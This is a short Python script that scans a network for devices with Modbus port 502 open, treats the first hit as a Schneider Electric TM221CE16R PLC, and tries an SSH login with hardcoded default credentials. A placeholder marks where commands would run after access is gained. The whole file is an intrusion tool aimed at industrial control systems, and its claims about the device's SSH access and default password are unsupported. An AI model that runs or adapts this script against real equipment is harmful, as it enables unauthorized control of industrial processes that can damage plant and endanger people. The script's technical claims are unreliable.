import os
import socket
import paramiko

# Default credentials for Schneider Electric TM221CE16R PLC
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "password"

# Function to scan the network for the PLC's IP address
def find_plc_ip():
    # Replace '192.168.1.0/24' with your network range
    network_range = "192.168.1.0/24"
    print(f"Scanning network {network_range} for the PLC...")
    
    # Using nmap to scan for open ports commonly used by PLCs
    # Port 502 is commonly used for Modbus communication
    nmap_command = f"nmap -p 502 --open {network_range} -oG - | awk '/Up$/{print $2}'"
    ip_addresses = os.popen(nmap_command).read().splitlines()
    
    if not ip_addresses:
        print("No PLC found on the network.")
        return None
    
    print(f"Found potential PLC at IP: {ip_addresses[0]}")
    return ip_addresses[0]

# Function to attempt SSH login with default credentials
def attempt_ssh_login(ip_address):
    print(f"Attempting SSH login to {ip_address} with default credentials...")
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(ip_address, username=DEFAULT_USERNAME, password=DEFAULT_PASSWORD)
        print("Login successful!")
        # Execute commands or perform actions here
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print("Authentication failed. Default credentials did not work.")
        return False
    except Exception as e:
        print(f"An error occurred: {e}")
        return False

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        attempt_ssh_login(plc_ip)
    else:
        print("PLC IP address not found. Exiting...")

if __name__ == "__main__":
    main()